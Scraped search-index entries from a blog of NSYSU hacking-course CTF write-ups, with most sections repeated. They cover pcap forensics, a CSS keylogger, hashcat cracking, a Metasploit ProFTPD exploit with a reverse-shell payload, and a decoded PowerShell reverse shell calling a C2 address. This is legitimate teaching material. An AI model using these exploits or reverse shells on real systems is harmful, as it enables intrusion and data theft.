as shown. Use File \u003e Export Objects \u003e HTTP... to dump specified files (focus on multipart/form-data). Save all files, then use hex editor to fix image headers according to PNG. After fixing images, Flag is visible. About five images total - I randomly poked and got the Flag haha ","date":"2020-11-09","objectID":"/en/posts/2020/nsysu-htcf-midterm-writeups/:2:1","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] Midterm Writeups","uri":"/en/posts/2020/nsysu-htcf-midterm-writeups/#description"},{"categories":["Cyber Security"],"content":" images 0x1 (100 points, 23 solves) Descriptionimages~ images~ images~ hint: flag is in the image Released file (pcap) Solution Note Heard many people solved this cleanly with NetworkMiner(?) But packet count was low during exam so I didn’t think much - my approach is more manual Opening .pcap with wireshark, Follow \u003e TCP Stream shows roughly 10 streams. Many contain .png headers as shown. Use File \u003e Export Objects \u003e HTTP... to dump specified files (focus on multipart/form-data). Save all files, then use hex editor to fix image headers according to PNG. After fixing images, Flag is visible. About five images total - I randomly poked and got the Flag haha ","date":"2020-11-09","objectID":"/en/posts/2020/nsysu-htcf-midterm-writeups/:2:1","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] Midterm Writeups","uri":"/en/posts/2020/nsysu-htcf-midterm-writeups/#solution"},{"categories":["Cyber Security"],"content":" CSS-Keylogger (150 points, 8 solves) DescriptionInteresting CSS Keylogger articles: CSS keylogger: Attack and Defense Stealing Data With CSS: Attack and Defense Try to analyze this CSS Keylogger attack in the packet and find the victim’s email and password on c7f website, then try to login hint: Good luck or skill to get the flag in the mini-game Website: http://c7f.macacahub.tw/login Released file (pcap) SolutionThe two articles on CSS Keylogger are supplementary material. Researching the site reveals it was hacked - CSS Keylogger is in bootstrap.min.css (you can solve without knowing this XD). Website source code shows login validates email format and password is salted then hashed - don’t expect to crack the hash from packets =w= From .pcap’s Follow \u003e TCP Stream, observe CSS Keylogger parameters as mentioned in articles. /e/ indicates email, /p/ indicates password - also a hint. Organizing observed packet features, filter them out (or slowly click through TCP Stream XD). text http \u0026\u0026 ip.dst == 45.79.159.73 Got three accounts. Then some luck trying to login… yes, I say this because I tried credentials for 30 minutes without success, finally gave up and mysteriously logged in XDDDDDD Post-competition discussion with TA had no clear conclusion. Share thoughts if any QQ After login… catch the monkeys!! Only one of five monkeys gives Flag when clicked. To avoid mouse clicking, shrink window to trap them, or directly open source code to find the link for Flag!! ","date":"2020-11-09","objectID":"/en/posts/2020/nsysu-htcf-midterm-writeups/:2:2","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] Midterm Writeups","uri":"/en/posts/2020/nsysu-htcf-midterm-writeups/#css-keylogger-150-points-8-solves"},{"categories":["Cyber Security"],"content":" CSS-Keylogger (150 points, 8 solves) DescriptionInteresting CSS Keylogger articles: CSS keylogger: Attack and Defense Stealing Data With CSS: Attack and Defense Try to analyze this CSS Keylogger attack in the packet and find the victim’s email and password on c7f website, then try to login hint: Good luck or skill to get the flag in the mini-game Website: http://c7f.macacahub.tw/login Released file (pcap) SolutionThe two articles on CSS Keylogger are supplementary material. Researching the site reveals it was hacked - CSS Keylogger is in bootstrap.min.css (you can solve without knowing this XD). Website source code shows login validates email format and password is salted then hashed - don’t expect to crack the hash from packets =w= From .pcap’s Follow \u003e TCP Stream, observe CSS Keylogger parameters as mentioned in articles. /e/ indicates email, /p/ indicates password - also a hint. Organizing observed packet features, filter them out (or slowly click through TCP Stream XD). text http \u0026\u0026 ip.dst == 45.79.159.73 Got three accounts. Then some luck trying to login… yes, I say this because I tried credentials for 30 minutes without success, finally gave up and mysteriously logged in XDDDDDD Post-competition discussion with TA had no clear conclusion. Share thoughts if any QQ After login… catch the monkeys!! Only one of five monkeys gives Flag when clicked. To avoid mouse clicking, shrink window to trap them, or directly open source code to find the link for Flag!! ","date":"2020-11-09","objectID":"/en/posts/2020/nsysu-htcf-midterm-writeups/:2:2","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] Midterm Writeups","uri":"/en/posts/2020/nsysu-htcf-midterm-writeups/#description-1"},{"categories":["Cyber Security"],"content":" CSS-Keylogger (150 points, 8 solves) DescriptionInteresting CSS Keylogger articles: CSS keylogger: Attack and Defense Stealing Data With CSS: Attack and Defense Try to analyze this CSS Keylogger attack in the packet and find the victim’s email and password on c7f website, then try to login hint: Good luck or skill to get the flag in the mini-game Website: http://c7f.macacahub.tw/login Released file (pcap) SolutionThe two articles on CSS Keylogger are supplementary material. Researching the site reveals it was hacked - CSS Keylogger is in bootstrap.min.css (you can solve without knowing this XD). Website source code shows login validates email format and password is salted then hashed - don’t expect to crack the hash from packets =w= From .pcap’s Follow \u003e TCP Stream, observe CSS Keylogger parameters as mentioned in articles. /e/ indicates email, /p/ indicates password - also a hint. Organizing observed packet features, filter them out (or slowly click through TCP Stream XD). text http \u0026\u0026 ip.dst == 45.79.159.73 Got three accounts. Then some luck trying to login… yes, I say this because I tried credentials for 30 minutes without success, finally gave up and mysteriously logged in XDDDDDD Post-competition discussion with TA had no clear conclusion. Share thoughts if any QQ After login… catch the monkeys!! Only one of five monkeys gives Flag when clicked. To avoid mouse clicking, shrink window to trap them, or directly open source code to find the link for Flag!! ","date":"2020-11-09","objectID":"/en/posts/2020/nsysu-htcf-midterm-writeups/:2:2","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] Midterm Writeups","uri":"/en/posts/2020/nsysu-htcf-midterm-writeups/#solution-1"},{"categories":["Cyber Security"],"content":" images 0x2 (250 points, 1 solve) DescriptionKids use tools to solve challenges, adults write code Released file (pcap) SolutionThis challenge has no special scenario - just obviously wanting students to solve with coding XD Similar approach to Hacking Attack \u0026 Defense hw_0x01 Writeup, just different content to restore. Packet challenge opening move Follow \u003e TCP Stream, seeing xor_key, image means XOR restoring images. Direction should be clear, but scrolling shows 100+ images, so write code. BTW, xor_key is base64 obfuscated - even decoded it’s unreadable strings. TA intentionally prevented manual verification (though images are hard to manually restore anyway…). Scapy tutorial referenced above, but note two scenarios when fetching Raw field data (as shown) - probably packets split due to length QQ. Condition judgment can use packet length or check data for keywords. Focus is on xor_key, image and… filename!! You’ll know after writing XD Since data is concatenated, processing is tricky… xor_key and image can be split by \\r\\n, but filename needs Regular Expression, or use fixed addresses (image lengths are actually the same XD). Rest should be clear from code :) python from scapy.all import * import re import base64 pkts = rdpcap('images_0x2.pcap') for p in pkts: if IP in p and p[IP].dst == '140.117.169.219': if Raw in p and b'filename' in p[Raw].load: raw = p[Raw].load filename = re.search(b'filename=\"(\\w*.\\w*)\"', raw) filename = filename.group(1).decode('utf-8') xor_key = base64.b64decode(raw.split(b'\\r\\n')[3]) ciphertext = raw.split(b'\\r\\n')[7] # Use mod to repeat padding xor_key res = [ word ^ xor_key[idx % len(xor_key)] for idx, word in enumerate(ciphertext) ] img = open(filename, 'wb') img.write(bytes(res)) img.close() Successfully dumping all images shows two filename types: 0-27 and timestamps. Just piece together the Flag!! ","date":"2020-11-09","objectID":"/en/posts/2020/nsysu-htcf-midterm-writeups/:2:3","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] Midterm Writeups","uri":"/en/posts/2020/nsysu-htcf-midterm-writeups/#images-0x2-250-points-1-solve"},{"categories":["Cyber Security"],"content":" images 0x2 (250 points, 1 solve) DescriptionKids use tools to solve challenges, adults write code Released file (pcap) SolutionThis challenge has no special scenario - just obviously wanting students to solve with coding XD Similar approach to Hacking Attack \u0026 Defense hw_0x01 Writeup, just different content to restore. Packet challenge opening move Follow \u003e TCP Stream, seeing xor_key, image means XOR restoring images. Direction should be clear, but scrolling shows 100+ images, so write code. BTW, xor_key is base64 obfuscated - even decoded it’s unreadable strings. TA intentionally prevented manual verification (though images are hard to manually restore anyway…). Scapy tutorial referenced above, but note two scenarios when fetching Raw field data (as shown) - probably packets split due to length QQ. Condition judgment can use packet length or check data for keywords. Focus is on xor_key, image and… filename!! You’ll know after writing XD Since data is concatenated, processing is tricky… xor_key and image can be split by \\r\\n, but filename needs Regular Expression, or use fixed addresses (image lengths are actually the same XD). Rest should be clear from code :) python from scapy.all import * import re import base64 pkts = rdpcap('images_0x2.pcap') for p in pkts: if IP in p and p[IP].dst == '140.117.169.219': if Raw in p and b'filename' in p[Raw].load: raw = p[Raw].load filename = re.search(b'filename=\"(\\w*.\\w*)\"', raw) filename = filename.group(1).decode('utf-8') xor_key = base64.b64decode(raw.split(b'\\r\\n')[3]) ciphertext = raw.split(b'\\r\\n')[7] # Use mod to repeat padding xor_key res = [ word ^ xor_key[idx % len(xor_key)] for idx, word in enumerate(ciphertext) ] img = open(filename, 'wb') img.write(bytes(res)) img.close() Successfully dumping all images shows two filename types: 0-27 and timestamps. Just piece together the Flag!! ","date":"2020-11-09","objectID":"/en/posts/2020/nsysu-htcf-midterm-writeups/:2:3","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] Midterm Writeups","uri":"/en/posts/2020/nsysu-htcf-midterm-writeups/#description-2"},{"categories":["Cyber Security"],"content":" images 0x2 (250 points, 1 solve) DescriptionKids use tools to solve challenges, adults write code Released file (pcap) SolutionThis challenge has no special scenario - just obviously wanting students to solve with coding XD Similar approach to Hacking Attack \u0026 Defense hw_0x01 Writeup, just different content to restore. Packet challenge opening move Follow \u003e TCP Stream, seeing xor_key, image means XOR restoring images. Direction should be clear, but scrolling shows 100+ images, so write code. BTW, xor_key is base64 obfuscated - even decoded it’s unreadable strings. TA intentionally prevented manual verification (though images are hard to manually restore anyway…). Scapy tutorial referenced above, but note two scenarios when fetching Raw field data (as shown) - probably packets split due to length QQ. Condition judgment can use packet length or check data for keywords. Focus is on xor_key, image and… filename!! You’ll know after writing XD Since data is concatenated, processing is tricky… xor_key and image can be split by \\r\\n, but filename needs Regular Expression, or use fixed addresses (image lengths are actually the same XD). Rest should be clear from code :) python from scapy.all import * import re import base64 pkts = rdpcap('images_0x2.pcap') for p in pkts: if IP in p and p[IP].dst == '140.117.169.219': if Raw in p and b'filename' in p[Raw].load: raw = p[Raw].load filename = re.search(b'filename=\"(\\w*.\\w*)\"', raw) filename = filename.group(1).decode('utf-8') xor_key = base64.b64decode(raw.split(b'\\r\\n')[3]) ciphertext = raw.split(b'\\r\\n')[7] # Use mod to repeat padding xor_key res = [ word ^ xor_key[idx % len(xor_key)] for idx, word in enumerate(ciphertext) ] img = open(filename, 'wb') img.write(bytes(res)) img.close() Successfully dumping all images shows two filename types: 0-27 and timestamps. Just piece together the Flag!! ","date":"2020-11-09","objectID":"/en/posts/2020/nsysu-htcf-midterm-writeups/:2:3","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] Midterm Writeups","uri":"/en/posts/2020/nsysu-htcf-midterm-writeups/#solution-2"},{"categories":["Cyber Security"],"content":" Pwn","date":"2020-11-09","objectID":"/en/posts/2020/nsysu-htcf-midterm-writeups/:3:0","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] Midterm Writeups","uri":"/en/posts/2020/nsysu-htcf-midterm-writeups/#pwn"},{"categories":["Cyber Security"],"content":" hashmeow (120 points, 2 solves) Descriptionmacacahub.tw opened another port for ssh Want to get the flag? If you want it, you can have it all… go find it! I put all credentials in the files Tip hint 1: Files came from the ssh service host hint 2: 10k-most-common.txt is useful hint 3: port_number \u003e 1000 \u0026\u0026 port_number != 8778 \u0026\u0026 port_number != htcf.ports.port_number hint 4: flag is in a Linux directory with permission 1777 hint 5: Luck is also skill SolutionFrom htcf practice problems, port scanning starts with nmap - scanning domain for open port services (-p- equals -p 0-65535). bash $ nmap -p- macacahub.tw $ nmap -sV -p 55555 macacahub.tw From hint 3, target port is 55555. Using -sV shows ssh service (hint 1). Found connection entry. Now we need ssh credentials. Given passwd and shadow are password storage files, just hashed (see related article). For details see VBird’s Linux - Account Management. We need to crack the passwords!! From hint 2, find dictionary 10k-most-common.txt and download locally. Use hashcat password recovery tool - hashmeow hints at this XDDDD. See hashcat articles. Note shadow’s $6$ means SHA-512, corresponding to -m 1800. Add --show at end or no results (lol). Using hashcat on shadow finds two passwords: root:root and shelly:shelly, truly weak passwords… that’s hint 5. Next try logging in with shelly (normally nobody logs in directly as root, though this challenge also blocks root login). Finally find the Flag inside. From hint 4, Googling shows 1777 permission is /tmp directory. See VBird’s Linux - Permission and Process Management. Enter /tmp, find secret folder, easy Flag. ","date":"2020-11-09","objectID":"/en/posts/2020/nsysu-htcf-midterm-writeups/:3:1","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] Midterm Writeups","uri":"/en/posts/2020/nsysu-htcf-midterm-writeups/#hashmeow-120-points-2-solves"},{"categories":["Cyber Security"],"content":" hashmeow (120 points, 2 solves) Descriptionmacacahub.tw opened another port for ssh Want to get the flag? If you want it, you can have it all… go find it! I put all credentials in the files Tip hint 1: Files came from the ssh service host hint 2: 10k-most-common.txt is useful hint 3: port_number \u003e 1000 \u0026\u0026 port_number != 8778 \u0026\u0026 port_number != htcf.ports.port_number hint 4: flag is in a Linux directory with permission 1777 hint 5: Luck is also skill SolutionFrom htcf practice problems, port scanning starts with nmap - scanning domain for open port services (-p- equals -p 0-65535). bash $ nmap -p- macacahub.tw $ nmap -sV -p 55555 macacahub.tw From hint 3, target port is 55555. Using -sV shows ssh service (hint 1). Found connection entry. Now we need ssh credentials. Given passwd and shadow are password storage files, just hashed (see related article). For details see VBird’s Linux - Account Management. We need to crack the passwords!! From hint 2, find dictionary 10k-most-common.txt and download locally. Use hashcat password recovery tool - hashmeow hints at this XDDDD. See hashcat articles. Note shadow’s $6$ means SHA-512, corresponding to -m 1800. Add --show at end or no results (lol). Using hashcat on shadow finds two passwords: root:root and shelly:shelly, truly weak passwords… that’s hint 5. Next try logging in with shelly (normally nobody logs in directly as root, though this challenge also blocks root login). Finally find the Flag inside. From hint 4, Googling shows 1777 permission is /tmp directory. See VBird’s Linux - Permission and Process Management. Enter /tmp, find secret folder, easy Flag. ","date":"2020-11-09","objectID":"/en/posts/2020/nsysu-htcf-midterm-writeups/:3:1","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] Midterm Writeups","uri":"/en/posts/2020/nsysu-htcf-midterm-writeups/#description-3"},{"categories":["Cyber Security"],"content":" hashmeow (120 points, 2 solves) Descriptionmacacahub.tw opened another port for ssh Want to get the flag? If you want it, you can have it all… go find it! I put all credentials in the files Tip hint 1: Files came from the ssh service host hint 2: 10k-most-common.txt is useful hint 3: port_number \u003e 1000 \u0026\u0026 port_number != 8778 \u0026\u0026 port_number != htcf.ports.port_number hint 4: flag is in a Linux directory with permission 1777 hint 5: Luck is also skill SolutionFrom htcf practice problems, port scanning starts with nmap - scanning domain for open port services (-p- equals -p 0-65535). bash $ nmap -p- macacahub.tw $ nmap -sV -p 55555 macacahub.tw From hint 3, target port is 55555. Using -sV shows ssh service (hint 1). Found connection entry. Now we need ssh credentials. Given passwd and shadow are password storage files, just hashed (see related article). For details see VBird’s Linux - Account Management. We need to crack the passwords!! From hint 2, find dictionary 10k-most-common.txt and download locally. Use hashcat password recovery tool - hashmeow hints at this XDDDD. See hashcat articles. Note shadow’s $6$ means SHA-512, corresponding to -m 1800. Add --show at end or no results (lol). Using hashcat on shadow finds two passwords: root:root and shelly:shelly, truly weak passwords… that’s hint 5. Next try logging in with shelly (normally nobody logs in directly as root, though this challenge also blocks root login). Finally find the Flag inside. From hint 4, Googling shows 1777 permission is /tmp directory. See VBird’s Linux - Permission and Process Management. Enter /tmp, find secret folder, easy Flag. ","date":"2020-11-09","objectID":"/en/posts/2020/nsysu-htcf-midterm-writeups/:3:1","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] Midterm Writeups","uri":"/en/posts/2020/nsysu-htcf-midterm-writeups/#solution-3"},{"categories":["Cyber Security"],"content":" hashmeow root (50 points, 1 solve) DescriptionSame as hashmeow But flag is in root’s home SolutionContinuing from above. Lower points because Flag is just in different folder XD Go to root /. Moving to root directory per hint shows permission denied, even sudo doesn’t work QQ. But a basic privilege escalation is sudo su - we can find su in bin directory and execute directly. Root password is root:root from hashcat earlier. Easy privilege escalation!!! Just go to /root, get Flag!! ","date":"2020-11-09","objectID":"/en/posts/2020/nsysu-htcf-midterm-writeups/:3:2","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] Midterm Writeups","uri":"/en/posts/2020/nsysu-htcf-midterm-writeups/#hashmeow-root-50-points-1-solve"},{"categories":["Cyber Security"],"content":" hashmeow root (50 points, 1 solve) DescriptionSame as hashmeow But flag is in root’s home SolutionContinuing from above. Lower points because Flag is just in different folder XD Go to root /. Moving to root directory per hint shows permission denied, even sudo doesn’t work QQ. But a basic privilege escalation is sudo su - we can find su in bin directory and execute directly. Root password is root:root from hashcat earlier. Easy privilege escalation!!! Just go to /root, get Flag!! ","date":"2020-11-09","objectID":"/en/posts/2020/nsysu-htcf-midterm-writeups/:3:2","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] Midterm Writeups","uri":"/en/posts/2020/nsysu-htcf-midterm-writeups/#description-4"},{"categories":["Cyber Security"],"content":" hashmeow root (50 points, 1 solve) DescriptionSame as hashmeow But flag is in root’s home SolutionContinuing from above. Lower points because Flag is just in different folder XD Go to root /. Moving to root directory per hint shows permission denied, even sudo doesn’t work QQ. But a basic privilege escalation is sudo su - we can find su in bin directory and execute directly. Root password is root:root from hashcat earlier. Easy privilege escalation!!! Just go to /root, get Flag!! ","date":"2020-11-09","objectID":"/en/posts/2020/nsysu-htcf-midterm-writeups/:3:2","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] Midterm Writeups","uri":"/en/posts/2020/nsysu-htcf-midterm-writeups/#solution-4"},{"categories":["Cyber Security"],"content":" ProFTPD (120 points, 0 solve) DescriptionThere’s an FTP server in the local network with a vulnerability (netmask 255.255.255.0, not the xxx.xxx.xxx.1 host) First ssh remote connect to the attack host (same CTF platform credentials), then find the vulnerable host in the LAN, exploit it, and get the flag file under “/var/www/html/_backup” ssh -p 8778 {your_account}@macacahub.tw hint: Recommend modifying default LPORT SolutionAfter logging into “attack host”, per description we need to find vulnerable host in LAN (FTP Server hinted). Find current host IP, then nmap scan LAN. For this challenge, IP is 172.30.0.3, so LAN scan uses 172.30.0.0/24 or 172.30.0.*. Confirm FTP host exists then check version details. Aggressive approach: nmap -A 172.30.0.0/24 lists all details. Found FTP Server version ProFTPD 1.3.5. Google reveals vulnerability CVE-2015-3306. Use class-taught Metasploit Framework to attack this vulnerability. Yes!! The “attack host” has tools pre-installed - use msfconsole to find vulnerability tools. If lazy to Google CVE, directly search ProFTPD 1.3.5 in msf. Rest is tool usage - homework should teach basic operations XD Parameters: RHOST target IP is 172.30.0.2 from nmap, SITEPATH is /var/www/html/ from description (we can’t access _backup). This challenge also needs payloads… not all work, needs some luck. But few options so trying all is fast. After setting payload, recheck options, add LHOST as “attack host” so reverse shell bounces back properly. Successful attack gets FTP Server shell, just extract flag. Done. bash $ ifconfig # check current host ip: 172.30.0.3 $ nmap 172.30.0.0/24 # scan LAN, find FTP host (ip 172.30.0.2, port 21) $ nmap -sV -p 21 172.30.0.2 # check host details, found ProFTPD 1.3.5 $ msfconsole msf5 \u003e search ProFTPD 1.3.5 msf5 \u003e use unix/ftp/proftpd_modcopy_exec msf5 exploit(unix/ftp/proftpd_modcopy_exec) \u003e show options msf5 exploit(unix/ftp/proftpd_modcopy_exec) \u003e set RHOST \u003ctarget_ip\u003e msf5 exploit(unix/ftp/proftpd_modcopy_exec) \u003e set SITEPATH \u003ctarget_directory\u003e msf5 exploit(unix/ftp/proftpd_modcopy_exec) \u003e show payloads msf5 exploit(unix/ftp/proftpd_modcopy_exec) \u003e set payload cmd/unix/reverse_perl msf5 exploit(unix/ftp/proftpd_modcopy_exec) \u003e show options msf5 exploit(unix/ftp/proftpd_modcopy_exec) \u003e set LHOST \u003clocalhost_ip\u003e msf5 exploit(unix/ftp/proftpd_modcopy_exec) \u003e exploit (reverse shell) ls ls _backup cat _backup/f1aaag.txt ","date":"2020-11-09","objectID":"/en/posts/2020/nsysu-htcf-midterm-writeups/:3:3","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] Midterm Writeups","uri":"/en/posts/2020/nsysu-htcf-midterm-writeups/#proftpd-120-points-0-solve"},{"categories":["Cyber Security"],"content":" ProFTPD (120 points, 0 solve) DescriptionThere’s an FTP server in the local network with a vulnerability (netmask 255.255.255.0, not the xxx.xxx.xxx.1 host) First ssh remote connect to the attack host (same CTF platform credentials), then find the vulnerable host in the LAN, exploit it, and get the flag file under “/var/www/html/_backup” ssh -p 8778 {your_account}@macacahub.tw hint: Recommend modifying default LPORT SolutionAfter logging into “attack host”, per description we need to find vulnerable host in LAN (FTP Server hinted). Find current host IP, then nmap scan LAN. For this challenge, IP is 172.30.0.3, so LAN scan uses 172.30.0.0/24 or 172.30.0.*. Confirm FTP host exists then check version details. Aggressive approach: nmap -A 172.30.0.0/24 lists all details. Found FTP Server version ProFTPD 1.3.5. Google reveals vulnerability CVE-2015-3306. Use class-taught Metasploit Framework to attack this vulnerability. Yes!! The “attack host” has tools pre-installed - use msfconsole to find vulnerability tools. If lazy to Google CVE, directly search ProFTPD 1.3.5 in msf. Rest is tool usage - homework should teach basic operations XD Parameters: RHOST target IP is 172.30.0.2 from nmap, SITEPATH is /var/www/html/ from description (we can’t access _backup). This challenge also needs payloads… not all work, needs some luck. But few options so trying all is fast. After setting payload, recheck options, add LHOST as “attack host” so reverse shell bounces back properly. Successful attack gets FTP Server shell, just extract flag. Done. bash $ ifconfig # check current host ip: 172.30.0.3 $ nmap 172.30.0.0/24 # scan LAN, find FTP host (ip 172.30.0.2, port 21) $ nmap -sV -p 21 172.30.0.2 # check host details, found ProFTPD 1.3.5 $ msfconsole msf5 \u003e search ProFTPD 1.3.5 msf5 \u003e use unix/ftp/proftpd_modcopy_exec msf5 exploit(unix/ftp/proftpd_modcopy_exec) \u003e show options msf5 exploit(unix/ftp/proftpd_modcopy_exec) \u003e set RHOST msf5 exploit(unix/ftp/proftpd_modcopy_exec) \u003e set SITEPATH msf5 exploit(unix/ftp/proftpd_modcopy_exec) \u003e show payloads msf5 exploit(unix/ftp/proftpd_modcopy_exec) \u003e set payload cmd/unix/reverse_perl msf5 exploit(unix/ftp/proftpd_modcopy_exec) \u003e show options msf5 exploit(unix/ftp/proftpd_modcopy_exec) \u003e set LHOST msf5 exploit(unix/ftp/proftpd_modcopy_exec) \u003e exploit (reverse shell) ls ls _backup cat _backup/f1aaag.txt ","date":"2020-11-09","objectID":"/en/posts/2020/nsysu-htcf-midterm-writeups/:3:3","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] Midterm Writeups","uri":"/en/posts/2020/nsysu-htcf-midterm-writeups/#description-5"},{"categories":["Cyber Security"],"content":" ProFTPD (120 points, 0 solve) DescriptionThere’s an FTP server in the local network with a vulnerability (netmask 255.255.255.0, not the xxx.xxx.xxx.1 host) First ssh remote connect to the attack host (same CTF platform credentials), then find the vulnerable host in the LAN, exploit it, and get the flag file under “/var/www/html/_backup” ssh -p 8778 {your_account}@macacahub.tw hint: Recommend modifying default LPORT SolutionAfter logging into “attack host”, per description we need to find vulnerable host in LAN (FTP Server hinted). Find current host IP, then nmap scan LAN. For this challenge, IP is 172.30.0.3, so LAN scan uses 172.30.0.0/24 or 172.30.0.*. Confirm FTP host exists then check version details. Aggressive approach: nmap -A 172.30.0.0/24 lists all details. Found FTP Server version ProFTPD 1.3.5. Google reveals vulnerability CVE-2015-3306. Use class-taught Metasploit Framework to attack this vulnerability. Yes!! The “attack host” has tools pre-installed - use msfconsole to find vulnerability tools. If lazy to Google CVE, directly search ProFTPD 1.3.5 in msf. Rest is tool usage - homework should teach basic operations XD Parameters: RHOST target IP is 172.30.0.2 from nmap, SITEPATH is /var/www/html/ from description (we can’t access _backup). This challenge also needs payloads… not all work, needs some luck. But few options so trying all is fast. After setting payload, recheck options, add LHOST as “attack host” so reverse shell bounces back properly. Successful attack gets FTP Server shell, just extract flag. Done. bash $ ifconfig # check current host ip: 172.30.0.3 $ nmap 172.30.0.0/24 # scan LAN, find FTP host (ip 172.30.0.2, port 21) $ nmap -sV -p 21 172.30.0.2 # check host details, found ProFTPD 1.3.5 $ msfconsole msf5 \u003e search ProFTPD 1.3.5 msf5 \u003e use unix/ftp/proftpd_modcopy_exec msf5 exploit(unix/ftp/proftpd_modcopy_exec) \u003e show options msf5 exploit(unix/ftp/proftpd_modcopy_exec) \u003e set RHOST msf5 exploit(unix/ftp/proftpd_modcopy_exec) \u003e set SITEPATH msf5 exploit(unix/ftp/proftpd_modcopy_exec) \u003e show payloads msf5 exploit(unix/ftp/proftpd_modcopy_exec) \u003e set payload cmd/unix/reverse_perl msf5 exploit(unix/ftp/proftpd_modcopy_exec) \u003e show options msf5 exploit(unix/ftp/proftpd_modcopy_exec) \u003e set LHOST msf5 exploit(unix/ftp/proftpd_modcopy_exec) \u003e exploit (reverse shell) ls ls _backup cat _backup/f1aaag.txt ","date":"2020-11-09","objectID":"/en/posts/2020/nsysu-htcf-midterm-writeups/:3:3","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] Midterm Writeups","uri":"/en/posts/2020/nsysu-htcf-midterm-writeups/#solution-5"},{"categories":["Cyber Security"],"content":"NSYSU Hacking and Countermeasures course homework 1 writeup","date":"2020-11-03","objectID":"/en/posts/2020/nsysu-htcf-hw1/","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] HW 0x01 Writeup","uri":"/en/posts/2020/nsysu-htcf-hw1/"},{"categories":["Cyber Security"],"content":"Writeups from MacacaHub HTCF HW 0x01 - Reverse Shell Author: @stavhaygn Writeup By: @yctseng1227 ","date":"2020-11-03","objectID":"/en/posts/2020/nsysu-htcf-hw1/:0:0","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] HW 0x01 Writeup","uri":"/en/posts/2020/nsysu-htcf-hw1/#"},{"categories":["Cyber Security"],"content":" reverse shell (250 points)","date":"2020-11-03","objectID":"/en/posts/2020/nsysu-htcf-hw1/:1:0","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] HW 0x01 Writeup","uri":"/en/posts/2020/nsysu-htcf-hw1/#reverse-shell-250-points"},{"categories":["Cyber Security"],"content":" DescriptionMy shabby website seems to be under attack~!? Can you analyze the packet file to find the hacker’s C2 IP, commands executed, collected information, and stolen file contents (including flag)? Please help! QAQ ~ \u003c(_ _)\u003e Hint: powershell, reverse shell, symmetric encryption ","date":"2020-11-03","objectID":"/en/posts/2020/nsysu-htcf-hw1/:1:1","series":null,"tags":["NSYSU Hacking Attack \u0026 Defense","CTF-Writeup"],"title":"[NSYSU Hacking Attack \u0026 Defense] HW 0x01 Writeup","uri":"/en/posts/2020/nsysu-htcf-hw1/#description"},{"categories":["Cyber Security"],"content":" SolutionGiven a packet file .pcap for analysis. With few packets, use Follow \u003e TCP stream to combine fragmented packets for easier viewing. All 14 TCP streams are mostly readable, but after a PowerShell script section, there’s a completely unreadable packet segment (as shown). The PowerShell clearly has Base64 obfuscation (note the final %3D is URL encoded =). This challenge went live two days after our NSYSU security club’s session with speaker Still on PowerShell tricks. Decoding Base64 allows step-by-step analysis like in the club session. Tip Recommend VSCode highlighting for better readability 0w0 Script uses ; as semantic ending, so directly replace with newline\\n (but semicolons inside loops must remain) Encryption key $xor_passwd middle character is “0” not “O”… wrong will cause incomplete restoration xD ps1 function Get-Xor { $xor_passwd = \"x0R_\" $padding_xor_passwd = ($xor_passwd * [int]($args[0].Length / $xor_passwd.Length)) + $xor_passwd.Substring(0, $args[0].Length % $xor_passwd.Length) $args[0] = [System.Text.Encoding]::UTF8.GetBytes($args[0]) $args[0] = $( for ($i = 0; $i -lt $args[0].Length; $i++) { $args[0][$i] -bxor $padding_xor_passwd[$i] }) [System.Text.Encoding]::UTF8.GetString($args[0]) } $client = New-Object System.Net.Sockets.TCPClient(\"45.79.159.73\", 39637) $stream = $client.GetStream() [byte[]]$bytes = 0..65535|%{0} while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $command = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i) $command = Get-Xor $command $response = (iex $command 2\u003e\u00261 | Out-String ) $response = $response + \"PS \" + (pwd).Path + \"\u003e \" $response = GET-Xor $response $response = ([text.encoding]::ASCII).GetBytes($response) $stream.Write($response,0,$response.Length) $stream.Flush() } $client.Close() Many probably ran the PowerShell script directly. Reminder: 